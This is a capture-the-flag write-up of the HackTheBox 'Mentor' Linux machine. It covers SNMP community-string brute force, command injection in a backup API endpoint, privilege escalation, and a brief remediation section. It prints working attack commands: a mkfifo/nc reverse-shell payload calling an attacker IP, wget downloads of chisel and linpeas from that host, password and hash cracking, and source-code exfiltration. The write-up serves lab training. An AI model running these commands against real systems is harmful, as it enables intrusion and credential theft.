--- 
title: "HTB Mentor | Linux   Medium"
author: ""
date: 2023-04-12T22:36:30+02:00
description: ""
draft: false
disableComments: false
categories: ["security"]
series: [] #Taxonomy to list "See Also" Section in Opengraph Templates
tags: ["infrastructure", "code injection", "misconfiguration"]
slug: ""
summary: ""
---
HackTheBox Mentor is a Linux machine rated Medium. This machine flawed with security misconfiguration(A05:2021), and injection(A03:2021) also highlights the importance of reconnaissance.  

Attack Chain: The attack begins by exploiting SNMP misconfiguration. Then takes advantage of a command injection vulnerability to gain foothold. It further leveraged on sensitive credentials in the SNMP configuration to gain root privilege. 

#### Initialization
```bash
# connect to vpn
sudo openvpn --auth-nocache --config lab_connection.ovpn
``` 

#### Enumeration
```bash
# discover ports and services
sudo nmap -F -sSUV -Pn -n --scan-delay .5 --max-retries 3 -vvv -oA nmap_mentor 10.10.11.193 
xsltproc nmap_mentor.xml -o nmap_mentor.html    # converts xml to html
firefox nmap_mentor.html                        # view in browser
#--snip--#
22/tcp  open  OpenSSH 8.9p1 Ubuntu 3 
80/tcp  open  Apache httpd 2.4.52(GET HEAD POST OPTIONS)
161/udp open  snmp SNMPv1 server; net-snmp SNMPv3 server 

# discover technologies used
whatweb 10.10.11.193      # if domain exits add to host file and rerun command
#--snip--#
HTTPServer[Ubuntu Linux, Apache/2.4.52 (Ubuntu), Werkzeug/2.0.3 Python/3.6.9]
RedirectLocation[http://mentorquotes.htb/]

# add domain to hosts file
echo '10.10.11.193 mentorquotes.htb' | sudo tee -a /etc/hosts
``` 

Always investigate every URL and endpoint discovered using `curl`, taking a close look at the response headers or using a browser with the wappalyzer extension turned on to understand the technologies of the application. Check if common http header attack vectors are set. Be sure to skim through the source page. Keep in mind that you are interested in sabotaging an interactive element such as login forms, search bars etc.
```bash
# discover subdomains
# with ffuf
ffuf -c -u http://mentorquotes.htb/ -w /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt -H 'Host: FUZZ.mentorquotes.htb' -t 50 -ac -s -mc all
api

# with gobuster
gobuster vhost -u http://10.10.11.193/ -w /usr/share/seclists/Discovery/DNS/shubs-subdomains.txt -t 50

gobuster dns -d mentorquotes.htb -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt -t 50

# wfuzz
wfuzz -c -t 50 -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -u http://mentorquotes.htb/ -H 'Host: FUZZ.mentorquotes.htb' --hc '302'
#--snip--#
api

# add subdomain to hosts file
echo "10.10.11.193 mentorquotes.htb" | sudo sed -i 's/mentorquotes.htb/& api.mentorquotes.htb/' /etc/hosts
```

```bash
# discover directories
# with ffuf
ffuf -c -u http://mentorquotes.htb/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt -t 50 -ac -s

ffuf -c -u http://api.mentorquotes.htb/FUZZ -w /usr/share/seclists/Discovery/Web-Content/api/api-endpoints.txt -t 50 -ac
#--snip--#
/docs    200

# with gobuster
gobuster dir -u http://mentorquotes.htb/ -w /usr/share/seclists/Discovery/Web-Content/raft-small-directories.txt -t 50

gobuster dir -u http://api.mentorquotes.htb/ -w /usr/share/seclists/Discovery/Web-Content/api/api-seen-in-wild.txt -t 50

# with dirsearch
dirsearch -u http://mentorquotes.htb/ -t 50 -q -r

dirsearch -u http://api.mentorquotes.htb/ -t 50 -q -r
#--snip--#
/admin            307    # 307 is an internal redirect
/admin/backup     307
/docs             200
/users/           307     
/users/admin      307   
/users/login      307   
/admin/check      422

# with wfuzz
wfuzz -z file,/usr/share/seclists/Discovery/Web-Content/raft-medium-files-lowercase.txt -t 50 -u http://mentorquotes.htb/FUZZ --hc 404

wfuzz -z file,/usr/share/seclists/Discovery/Web-Content/common.txt -t 50 -u http://api.mentorquotes.htb/FUZZ --hc 404
#--snip--#
admin             307
docs              200
quotes            307
server-status     403
users             307
```

#### Exploration
Investigating `http://api.mentorquotes.htb/docs` shows it is a swagger documentation that describes the endpoints and their implemented methods. Studied `http://api.mentorquotes.htb/openapi.json` and discovered a contact name `james` url to the original website `http://mentorquotes.htb` and james' email address `james@mentorquotes.htb` . James supposedly could be the administrator of this site. I tried to gain access with james credentials using `curl` and guessing his password but had no result. Switched to brute forcing still without result.

```shell
# manually guess james login password
curl -X 'POST' \
  'http://api.mentorquotes.htb/auth/login' \
  -H 'accept: application/json' \
  -H 'Content-Type: application/json' \
  -d '{
  "email": "james@mentorquotes.htb",
  "username": "james",
  "password": "admin@123"
}'

## brute forcing the password
# with wfuzz
wfuzz -z file,/usr/share/seclists/Passwords/Common-Credentials/10-million-password-list-top-10000.txt -d '{ "email": "james@mentorquotes.htb", "username": "james", "password": "FUZZ"}' -u http://api.mentorquotes.htb/auth/login --hc 422

# with ffuf
ffuf -u http://api.mentorquotes.htb/auth/login -X POST -H 'Content-Type: application/json' -d '{ "email": "james@mentorquotes.htb", "username": "james", "password": "FUZZ"}' -w /usr/share/seclists/Passwords/Common-Credentials/10-million-password-list-top-10000.txt -fc '403'

# signing up with a new user
curl -X 'POST' \
  'http://api.mentorquotes.htb/auth/signup' \
  -H 'accept: application/json' \
  -H 'Content-Type: application/json' \
  -d '{
  "email": "hunter@mentorquotes.htb",
  "username": "hunter",
  "password": "P2ssw0R)"
}'
#--snip--# 
{"id":4,"email":"hunter@mentorquotes.htb","username":"hunter"}

# login with the new user credentials
curl -X 'POST' \
  'http://api.mentorquotes.htb/auth/login' \
  -H 'accept: application/json' \
  -H 'Content-Type: application/json' \
  -d '{
  "email": "hunter@mentorquotes.htb",
  "username": "hunter",
  "password": "P2ssw0R)"
}'
#--snip--# returned a jwt token
eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6Imh1bnRlciIsImVtYWlsIjoiaHVudGVyQG1lbnRvcnF1b3Rlcy5odGIifQ.c1TRNVvjuCK6ZIVY8PUvkwXh_qd97axRtBd_W7W7tX0

# using mentorquotes' swagger I got error that I was missing the Authorization header. I switched to thunderclient and applying the endpoints required schema header and got a 403 error. see mentor01 copied the curl snippet too.
curl -X GET \
  'http://api.mentorquotes.htb/users/' \
  --header 'Accept: */*' \
  --header 'User-Agent: Thunder Client (https://www.thunderclient.com)' \
  --header 'Accept: application/json' \
  --header 'Authorization: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6Imh1bnRlciIsImVtYWlsIjoiaHVudGVyQG1lbnRvcnF1b3Rlcy5odGIifQ.c1TRNVvjuCK6ZIVY8PUvkwXh_qd97axRtBd_W7W7tX0'
#--snip--#
{"detail":"Only admin users can access this resource"}   

# tested 'users/{id}', '/users/add' and was with same error as above.
```

![Request Users Endpoint](/images/mentor/mentor01.png "Request Users Endpoint")

Our enumeration also identified 161/UDP SNMP port. A quick search tag 'exploit snmp port' returned resources from [SNMP Arbitrary Command Execution](https://medium.com/rangeforce/snmp-arbitrary-command-execution-19a6088c888e) [Hackers Arise](https://www.hackers-arise.com/post/2016/06/07/exploiting-snmpv1-for-reconnaissance). Let's brute force for community strings and subsequently explore the Management Information Base(MIB).
```shell
# with onesixtyone
onesixtyone 10.10.11.193 -c /usr/share/seclists/Discovery/SNMP/common-snmp-community-strings-onesixtyone.txt
<<SNIP
10.10.11.193 [public] Linux mentor 5.15.0-56-generic #62-Ubuntu SMP Tue Nov 22 19:54:14 UTC 2022 x86_64
10.10.11.193 [public] Linux mentor 5.15.0-56-generic #62-Ubuntu SMP Tue Nov 22 19:54:14 UTC 2022 x86_64
SNIP

# with hydra - https://en.kali.tools/?p=220
hydra -P /usr/share/seclists/Discovery/SNMP/snmp.txt -t 50 -c .5 -m 1 10.10.11.193 snmp
<<SNIP
Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2023-03-25 12:56:07
[DATA] max 50 tasks per 1 server, overall 50 tasks, 3217 login tries (l:1/p:3217), ~65 tries per task
[DATA] attacking snmp://10.10.11.193:161/1
[161][snmp] host: 10.10.11.193   password: public
[STATUS] 401.00 tries/min, 401 tries in 00:01h, 2816 to do in 00:08h, 50 active
[STATUS] 383.67 tries/min, 1151 tries in 00:03h, 2066 to do in 00:06h, 50 active
[STATUS] 378.71 tries/min, 2651 tries in 00:07h, 566 to do in 00:02h, 50 active
[STATUS] 375.12 tries/min, 3001 tries in 00:08h, 216 to do in 00:01h, 50 active
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2023-03-25 13:04:49
SNIP

hydra -P /usr/share/seclists/Discovery/SNMP/common-snmp-community-strings.txt -t 50 -m 2 10.10.11.193 snmp # I abitrarily brute force with version 2c since is it transmits information in clear-text
<<SNIP
Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2023-03-25 12:56:17
[DATA] max 50 tasks per 1 server, overall 50 tasks, 118 login tries (l:1/p:118), ~3 tries per task
[DATA] attacking snmp://10.10.11.193:161/2
[161][snmp] host: 10.10.11.193   password: public
[161][snmp] host: 10.10.11.193   password: internal
1 of 1 target successfully completed, 2 valid passwords found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2023-03-25 12:56:42
SNIP

# with Matteo's snmp-check 
snmp-check -w 10.10.11.193       # the device is read-only and authenticates with 'public' community string on SNMPv1
<<SNIP
snmp-check v1.9 - SNMP enumerator
Copyright (c) 2005-2015 by Matteo Cantoni (www.nothink.org)
[+] Try to connect to 10.10.11.193:161 using SNMPv1 and community 'public'
[+] Write access check enabled
[*] Write access not permitted!
[*] System information:
Host IP address               : 10.10.11.193
Hostname                      : mentor
Description                   : Linux mentor 5.15.0-56-generic #62-Ubuntu SMP Tue Nov 22 19:54:14 UTC 2022 x86_64
Contact                       : Me <admin@mentorquotes.htb>
Location                      : Sitting on the Dock of the Bay
Uptime snmp                   : 02:30:13.94
Uptime system                 : 02:29:54.56
System date                   : 2023-3-25 09:47:38.0
SNIP

for string in $(cat /usr/share/seclists/Discovery/SNMP/common-snmp-community-strings.txt); do snmp-check -v 2c -c $string 10.10.11.193; done | tee -a snmp-checkv2c    # enumerate version 2c using a wordlist 
grep -A10 -B2 '\[\*\] System information:' snmp-checkv2c    # to identify successful response 
sed -n '/using SNMPv2c and community '\''internal'\''/,$p' snmp-checkv2c | more -n 15 # to skim through the output of the internal community string
<<SNIP
[*] Network interfaces:
# mynote: identified docker0 interface with MAC address 02:42:bd:fb:26:33
[*] Network IP: 
# mynote: identified ip range of 172.[17-22].0.1 subnet: 255.255.0.0
[*] TCP connections and listening ports: 
# mynote: identified a local address with ports 172.22.0.1:[81,5432,8000] that can talk to 0.0.0.0/0
[*] Processes:
# mynote: utility command arguments
docker-proxy /usr/bin/docker-proxy -proto tcp -host-ip 172.22.0.1 -host-port 5432 -container-ip 172.22.0.4 -container-port 5432
docker-proxy /usr/bin/docker-proxy -proto tcp -host-ip 172.22.0.1 -host-port 8000 -container-ip 172.22.0.3 -container-port 8000
python3 python3 -m uvicorn app.main:app --reload --workers 2 --host 0.0.0.0 --port 8000
docker-proxy /usr/bin/docker-proxy -proto tcp -host-ip 172.22.0.1 -host-port 81 -container-ip 172.22.0.2 -container-port 80
postgres postgres: postgres mentorquotes_db 172.22.0.1(53344) idle 
login.py /usr/bin/python3 /usr/local/bin/login.py kj23sadkj123as0-d213
[*] Software components:
# mynote: lots of utility exposed
SNIP

# with the net-snmp collection - http://www.net-snmp.org/
sudo apt install snmp    # install snmp
snmpcheck -H -n -pa 10.10.11.193  # enumerate the device - no useful response

for username in $(cat /usr/share/seclists/Usernames/Names/names.txt); do snmpwalk -v3 -l noAuthNoPriv -u $username 10.10.11.193; done 2>&1 | grep -v 'snmpwalk: Unknown user name' | tee -a snmpwalkv3user
   # brute for the snmp user
snmpbulkwalk 10.10.11.193 -v2c -c internal -m all  | tee -a snmpbulkwalk_mib    # dump all information of this device.
<<SNIP
# mynote: interesting line in the returned oids
iso.3.6.1.2.1.25.4.2.1.5.2124 = STRING: "/usr/local/bin/login.py kj23sadkj123as0-d213"
SNIP

# now i tried using that as james password
curl 'http://api.mentorquotes.htb/auth/login' \
  --header 'Content-Type: application/json' \
  --data-raw '{
  "email": "james@mentorquotes.htb",
  "username": "james",
  "password": "kj23sadkj123as0-d213"
}'
#--snip--#
eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6ImphbWVzIiwiZW1haWwiOiJqYW1lc0BtZW50b3JxdW90ZXMuaHRiIn0.peGpmshcF666bimHkYIBKQN7hj5m785uKcjwbD--Na0

# note: if there was a special claim like {"isAdmin": true} then we would have gone for brute forcing the secret so we sign a new user with admin privileges. but we already have an admin token. It every other case where the user is not a likely admin brute force the jwt to see if you can find its secret.

# requested the /users/ endpoint again
curl -X GET \
  'http://api.mentorquotes.htb/users/' \
  --header 'Content-Type: application/json' \
  --header 'Authorization: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6ImphbWVzIiwiZW1haWwiOiJqYW1lc0BtZW50b3JxdW90ZXMuaHRiIn0.peGpmshcF666bimHkYIBKQN7hj5m785uKcjwbD--Na0' | jq .
<<SNIP
[
  {
    "id": 1,
    "email": "james@mentorquotes.htb",
    "username": "james"
  },
  {
    "id": 2,
    "email": "svc@mentorquotes.htb",
    "username": "service_acc"
  },
  {
    "id": 4,
    "email": "hunter@mentorquotes.htb",
    "username": "hunter"
  },
  {
    "id": 5,
    "email": "root@example.com",
    "username": "rootme"
  }
]
SNIP

# clearly james is the admin so I request the /admin endpoint returned from our web path brute force
curl 'http://api.mentorquotes.htb/admin/' \
  --header 'Content-Type: application/json' \
  --header 'Authorization: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6ImphbWVzIiwiZW1haWwiOiJqYW1lc0BtZW50b3JxdW90ZXMuaHRiIn0.peGpmshcF666bimHkYIBKQN7hj5m785uKcjwbD--Na0' | jq .
<<SNIP
{
  "admin_funcs": {
    "check db connection": "/check",
    "backup the application": "/backup"
  }
}
SNIP

# returned output matches earlier discovered web path /admin/check and /admin/backup
curl 'http://api.mentorquotes.htb/admin/check' \
  -H 'Content-Type: application/json' \
  -H 'Authorization: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6ImphbWVzIiwiZW1haWwiOiJqYW1lc0BtZW50b3JxdW90ZXMuaHRiIn0.peGpmshcF666bimHkYIBKQN7hj5m785uKcjwbD--Na0'
#--snip--#
{"details":"Not implemented yet!"}

# with trials: requesting with POST method, using an empty i.e {} data payload, discovered that /backup uses a post method and require a `path` field for the body.
curl -X POST 'http://api.mentorquotes.htb/admin/backup' \
  -H 'Content-Type: application/json' \
  -H 'Authorization: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6ImphbWVzIiwiZW1haWwiOiJqYW1lc0BtZW50b3JxdW90ZXMuaHRiIn0.peGpmshcF666bimHkYIBKQN7hj5m785uKcjwbD--Na0' \
-d '{"path":""}' -v   # see mentor02

# there appears to be an interaction of which this endpoint may be vulnerable to code or command injection. let's run some quick check for this vulnerability. start a horizontally spiltted terminal
# on terminal one
sudo tcpdump -ni tun0 icmp        # listen for icmp packet on tun0 interface

# on terminal two
curl 'http://api.mentorquotes.htb/admin/backup' \
  -H 'Content-Type: application/json' \
  -H 'Authorization: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6ImphbWVzIiwiZW1haWwiOiJqYW1lc0BtZW50b3JxdW90ZXMuaHRiIn0.peGpmshcF666bimHkYIBKQN7hj5m785uKcjwbD--Na0' \
  -d '{"path":"`ping -c1 10.10.14.85`"}'     # request the endpoint with a ping command as the path's value 
```

![Request Users Endpoint](/images/mentor/mentor02.png "Request Users Endpoint")

#### Exploitation
```shell
# we can confirm `/admin/backup` is command injectable. let's get a reverse shell. 

# on terminal one run an nc listener
nc -lvnp 9009

# on terminal two run
curl 'http://api.mentorquotes.htb/admin/backup' \
  -H 'Content-Type: application/json' \
  -H 'Authorization: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6ImphbWVzIiwiZW1haWwiOiJqYW1lc0BtZW50b3JxdW90ZXMuaHRiIn0.peGpmshcF666bimHkYIBKQN7hj5m785uKcjwbD--Na0' \
-d '{"path":"`rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.10.14.85 9009 >/tmp/f`"}'

# drops into a container shell
id    # uid=0(root) gid=0(root) groups=0(root) ...
hostname    # c853438556d9
ls -lah    # list content
#--snip--#
drwxr-xr-x    1 root     root        4.0K Nov 10 16:00 .
drwxr-xr-x    1 root     root        4.0K Mar 25 07:17 ..
-rw-r--r--    1 root     root        1.0K Jun 12  2022 .Dockerfile.swp
-rw-r--r--    1 root     root         522 Nov  3 12:58 Dockerfile
drwxr-xr-x    1 root     root        4.0K Nov 10 16:00 app
-rw-r--r--    1 root     root         672 Jun  4  2022 requirements.txt

# explore contents of all files and found 
find . -type f -exec ls -lah {} +; 2>/dev/null
# interesting finds
./app/db.py
./app/main.py
./app/requirements.txt
<<SNIP
# Database url if none is passed the default one is used
DATABASE_URL = os.getenv("DATABASE_URL", "postgresql://postgres:postgres@172.22.0.1/mentorquotes_db")
SNIP

# upload chisel to the container and start a session
# attacker's machine
python3 -m http.server 8100 -b 10.10.14.85 -d ../../tools
chmod 774 ../../tools/chisel
sudo ../../tools/chisel server --port 9009 --reverse

# on victim machine
wget http://10.10.14.85:8100/chisel
chmod 774 ./chisel
./chisel client -v 10.10.14.85:9009 R:5435:172.22.0.1:5432

# open another terminal on attacker's machine
psql -h 127.0.0.1 -p 5435 -U postgres -d mentorquotes_db   # on prompt submit the password: postgres
\d                           # list tables
select * from users;         # explore the users table
<<SNIP
 id |          email          |  username   |             password             
----+-------------------------+-------------+----------------------------------
  1 | james@mentorquotes.htb  | james       | 7ccdcd8c05b59add9c198d492b36a503
  2 | svc@mentorquotes.htb    | service_acc | 53f22d0dfa10dce7e29cd31f4f953fd8
  4 | hunter@mentorquotes.htb | hunter      | e5eaa3a953d200a15ed8a9610049cb7a
SNIP

# save the hashes to file mentor.hash
#--nano mentor.hash--#
james:7ccdcd8c05b59add9c198d492b36a503
service_acc:53f22d0dfa10dce7e29cd31f4f953fd8
#--mentor.hash--#

## cracking the hashes 
# using online tools: https://hashes.com/en/tools/hash_identifier 
53f22d0dfa10dce7e29cd31f4f953fd8 - 123meunomeeivani - Possible algorithms: MD5

# with hashcat
hashcat -m 0 --username mentor.hash /usr/share/wordlists/rockyou.txt -O
hashcat -m 0 --username mentor.hash --show
#--snip--#
service_acc:53f22d0dfa10dce7e29cd31f4f953fd8:123meunomeeivani

# with john the ripper
john --format=Raw-MD5 --wordlist=/usr/share/wordlists/rockyou.txt mentor.hash
john --format=Raw-MD5 mentor.hash --show
#--snip--#
service_acc:123meunomeeivani

# ssh into the box
ssh svc@mentorquotes.htb    # on prompt submit the password: 123meunomeeivani
ls -lah
cat user.txt                # captured the user flag
```

![Data Exfiltration](/images/mentor/mentor03.png "Data Exfiltration")

#### Escalation
```bash				       
# get users with shell
cat /etc/passwd | grep -i "sh$"	  
#--snip--#
root:x:0:0:root:/root:/bin/bash
svc:x:1001:1001:,,,:/home/svc:/bin/bash
james:x:1000:1000:,,,:/home/james:/bin/bash

sudo -l					# users sudo right - none
ss -tpln				# open tcp ports  - no further interesting port

# start a local server on attacker's machine and upload linpea
wget http://10.10.14.85:8100/linpeas.sh
chmod 774 ./linpeas.sh
./linpeas.sh | tee -a linout  
<<SNIP
╔══════════╣ Analyzing SNMP Files (limit 70)
-rw-r--r-- 1 root root 3453 Jun  5  2022 /etc/snmp/snmpd.conf

╔══════════╣ Unexpected in /opt (usually empty)
total 12
drwxr-xr-x  3 root root 4096 Jun  3  2022 .
drwxr-xr-x 19 root root 4096 Nov 10 16:00 ..
drwx--x--x  4 root root 4096 Jun  3  2022 containerd
SNIP

# investigated /etc/snmp/snmpd.conf
<<SNIP
createUser bootstrap MD5 SuperSecurePassword123__ DES
rouser bootstrap priv
SNIP

# tried this on root and james for ssh login. james worked!
su james            # on prompt submit password: SuperSecurePassword123__
cd ~
ls -lah     
sudo -l		       # users sudo right - runs  /bin/sh
<<SNIP
Matching Defaults entries for james on mentor:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
    use_pty

User james may run the following commands on mentor:
    (ALL) /bin/sh
SNIP
sudo /bin/sh -p    # effective user root
id   # uid=0(root) gid=0(root) groups=0(root)
cd ~
ls -lah
cat root.txt        # captured the root flag
```

#### Exfiltration
Collected the source code and some configuration files to further analyse the application.
```shell
## victim machine: on the sh shell as the root user
docker ps
<<SNIP
CONTAINER ID   IMAGE         COMMAND                  CREATED        STATUS        PORTS                       NAMES
f346f842a2b1   docker_web    "python main.py"         24 hours ago   Up 24 hours   172.22.0.1:81->80/tcp       docker_web_1
c853438556d9   docker_api    "python3 -m uvicorn …"   24 hours ago   Up 24 hours   172.22.0.1:8000->8000/tcp   docker_api_1
96e44c569292   postgres:13   "docker-entrypoint.s…"   9 months ago   Up 24 hours   172.22.0.1:5432->5432/tcp   docker_postgres_1
SNIP

# web application
docker exec -it docker_web_1 sh     # drop into the container
python -m http.server 8003    # start a server, and collect on logged in on ssh as svc user

# api application
docker exec -it docker_api_1 sh
python -m http.server 8003

## victim machine: on ssh shell as svc user
# web source code
wget -R "index.html*" -c -r -L -p -nc -nH -P docker_web  http://172.22.0.2:8003/   # download from container
python3 -m http.server 8003 -d docker_web/    # start a server, and collect on attacker's machine

# api source code
wget -R "index.html*" -c -r -L -p -nc -nH -P docker_api  http://172.22.0.3:8003/    
python3 -m http.server 8003 -d docker_api/

## on attacker's machine
# -R(ignore index.html), -c(continue downloading on interruption), -r(recursively download resources), -L(follow symbolic link), -p(download all static contents) -nc(don't download existing file in current directory), -nH(save all files), -P(give the downloaded directory the specified name)
wget -R "index.html*" -c -r -L -p -nc -nH -P docker_web  http://10.10.11.193:8003/    # web
wget -R "index.html*" -c -r -L -p -nc -nH -P docker_api  http://10.10.11.193:8003/    # api

# remember to dowload the image: postgres:13
```

[/etc/apache2/sites-enabled/000-default.conf](#/etc/apache2/sites-enabled/000-default.conf)
```xml
<VirtualHost *:80>
	ProxyPreserveHost On
        ServerName mentorquotes.htb
        ServerAdmin admin@mentorquotes.htb
        ProxyPass / http://172.22.0.1:81/
        ProxyPassReverse / http://172.22.0.1:81/

	RewriteEngine On
        RewriteCond %{HTTP_HOST} !^mentorquotes.htb$
        RewriteRule /.* http://mentorquotes.htb/ [R]

        ErrorLog ${APACHE_LOG_DIR}/error.log
        CustomLog ${APACHE_LOG_DIR}/access.log combined

</VirtualHost>

<VirtualHost *:80>

	ServerName api.mentorquotes.htb
	ServerAdmin admin@mentorquotes.htb
	ProxyPass / http://172.22.0.1:8000/
	ProxyPassReverse / http://172.22.0.1:8000/
	ErrorLog ${APACHE_LOG_DIR}/error.log
	CustomLog ${APACHE_LOG_DIR}/access.log combined

</VirtualHost>

# vim: syntax=apache ts=4 sw=4 sts=4 sr noet


```

The `/etc/apache2/sites-enabled/000-default.conf`  shows the web app is proxied via  `172.22.0.1:81` while the api app is proxied via `172.22.0.1:8000`. One of the hunch that came to mind while enumerating the SNMP following the findings gathered was to run a sqlmap as shown in the code block. However that was futile. My best guess was that the proxy has to be on my local machine.

```shell
# sqlmap via proxy
sqlmap -u 'http://api.mentorquotes.htb/auth/login' \
--method POST \
--header 'Content-Type: application/json' \
--data '{
  "email": "james@mentorquotes.htb",
  "username": "james",
  "password": "kj23sadkj123as0-d213"
}' \
--proxy 'http://172.22.0.1:8000' \
--threads 10 --level 5 --risk=3 \ 
--dbms PostgreSQL --dbs \
--random-agent --batch

# sqlmap with proxy
sqlmap -u 'http://api.mentorquotes.htb/auth/login' \
--method POST \
--header 'Content-Type: application/json' \
--data '{
  "email": "james@mentorquotes.htb",
  "username": "james",
  "password": "kj23sadkj123as0-d213"
}' \
--threads 10 --level 5 --risk=3 \ 
--dbms PostgreSQL --dbs \
--random-agent --batch

```

[/etc/snmp/snmpd.conf](#/etc/snmp/snmpd.conf)
```text
###########################################################################
#
# snmpd.conf
# An example configuration file for configuring the Net-SNMP agent ('snmpd')
# See snmpd.conf(5) man page for details
#
###########################################################################
# SECTION: System Information Setup
#

# syslocation: The [typically physical] location of the system.
#   Note that setting this value here means that when trying to
#   perform an snmp SET operation to the sysLocation.0 variable will make
#   the agent return the "notWritable" error code.  IE, including
#   this token in the snmpd.conf file will disable write access to
#   the variable.
#   arguments:  location_string
sysLocation    Sitting on the Dock of the Bay
sysContact     Me <admin@mentorquotes.htb>

# sysservices: The proper value for the sysServices object.
#   arguments:  sysservices_number
sysServices    72



###########################################################################
# SECTION: Agent Operating Mode
#
#   This section defines how the agent will operate when it
#   is running.

# master: Should the agent operate as a master agent or not.
#   Currently, the only supported master agent type for this t
#   is "agentx".
#   
#   arguments: (on|yes|agentx|all|off|no)

master  agentx

# agentaddress: The IP address and port number that the agent will listen on.
#   By default the agent listens to any and all traffic from any
#   interface on the default SNMP port (161).  This allows you to
#   specify which address, interface, transport type and port(s) that you
#   want the agent to listen on.  Multiple definitions of this token
#   are concatenated together (using ':'s).
#   arguments: [transport:]port[@interface/address],...

# agentaddress  127.0.0.1,[::1]
agentAddress udp:161,udp6:[::1]:161


###########################################################################
# SECTION: Access Control Setup
#
#   This section defines who is allowed to talk to your running
#   snmp agent.

# Views 
#   arguments viewname included [oid]

#  system + hrSystem groups only
view   systemonly  included   .1.3.6.1.2.1.1
view   systemonly  included   .1.3.6.1.2.1.25.1


# rocommunity: a SNMPv1/SNMPv2c read-only access community name
#   arguments:  community [default|hostname|network/bits] [oid | -V view]

# Read-only access to everyone to the systemonly view
rocommunity  public default -V systemonly
rocommunity6 public default -V systemonly

# SNMPv3 doesn't use communities, but users with (optionally) an
# authentication and encryption string. This user needs to be created
# with what they can view with rouser/rwuser lines in this file.
#
# createUser username (MD5|SHA|SHA-512|SHA-384|SHA-256|SHA-224) authpassphrase [DES|AES] [privpassphrase]
# e.g.
# createuser authPrivUser SHA-512 myauthphrase AES myprivphrase
#
# This should be put into /var/lib/snmp/snmpd.conf 
#
# rouser: a SNMPv3 read-only access username
#    arguments: username [noauth|auth|priv [OID | -V VIEW [CONTEXT]]]
rouser authPrivUser authpriv -V systemonly

# include a all *.conf files in a directory
includeDir /etc/snmp/snmpd.conf.d


createUser bootstrap MD5 SuperSecurePassword123__ DES
rouser bootstrap priv

com2sec AllUser default internal
group AllGroup v2c AllUser
#view SystemView included .1.3.6.1.2.1.1
view SystemView included .1.3.6.1.2.1.25.1.1
view AllView included .1
access AllGroup "" any noauth exact AllView none none

```

I tried to snmpwalk the device using v3 from outside the system but was unable.
```shell
# enumerating the device: -v3(use snmp version 3), -l(specify the authentication type), -a(authentication protocol), -A(authentication protocol passphrase), -x(privacy protocol), -X(privacy protocol passphrase), network device
snmpwalk -v3 -l authPriv -u bootstrap -a MD5 -A SuperSecurePassword123__ -x DES -X internal 10.10.11.193
```

[/usr/local/bin/login.py](#/usr/local/bin/login.py)
```python
#!/usr/bin/python3
import requests, time
import sys, os

user = 'james'
passw = sys.argv[1]

json_data = {
    'email': f'{user}@mentorquotes.htb',
    'username': user,
    'password': passw,
}

while True:
	response = requests.post('http://172.22.0.1:8000/auth/login', json=json
_data)

	if 'Not authorized!' in response:
		os.system(f"echo [{time.asctime()}] FAILED LOGIN! >> /root/logi
ns.log")

	time.sleep(20)
```

#### Remediation
**Fixing the Foothold Vector**  
Although the discovery of 'kj23sadkj123as0-d213' via SNMP was the gateway to the comprise because the developer forgot to clean up the cron command used via the svc user. This comprise unfortunately was a code flaw issue. 
[svc user cron file](#svccronfile)
```text
# Edit this file to introduce tasks to be run by cron.
# 
# Each task to run has to be defined through a single line
# indicating with different fields when the task will be run
# and what command to run for the task
# 
# To define the time you can provide concrete values for
# minute (m), hour (h), day of month (dom), month (mon),
# and day of week (dow) or use '*' in these fields (for 'any').
# 
# Notice that tasks will be started based on the cron's system
# daemon's notion of time and timezones.
# 
# Output of the crontab jobs (including errors) is sent through
# email to the user the crontab file belongs to (unless redirected).
# 
# For example, you can run a backup of all your user accounts
# at 5 a.m every week with:
# 0 5 * * 1 tar -zcf /var/backups/home.tgz /home/
# 
# For more information see the manual pages of crontab(5) and cron(8)
# 
# m h  dom mon dow   command
# 10 * * * *  sleep 30; /usr/local/bin/login.py 'kj23sadkj123as0-d213'

```

The infrastructure was tightly deployed. The applications were placed behind a reverse proxy, the Dockerfile was well built except for not specifying a non-root user the container should run with. 
```shell
trivy config docker_api/Dockerfile 
<<SNIP
Dockerfile (dockerfile)

Tests: 24 (SUCCESSES: 22, FAILURES: 2, EXCEPTIONS: 0)
Failures: 2 (UNKNOWN: 0, LOW: 1, MEDIUM: 0, HIGH: 1, CRITICAL: 0)

HIGH: Specify at least 1 USER command in Dockerfile with non-root user as argument
════════════════════════════════════════════════════════════════════════════════
Running containers with 'root' user can lead to a container escape situation. It is a best practice to run containers as non-root users, which can be done by adding a 'USER' statement to the Dockerfile.

See https://avd.aquasec.com/misconfig/ds002
────────────────────────────────────────────────────────────────────────────────


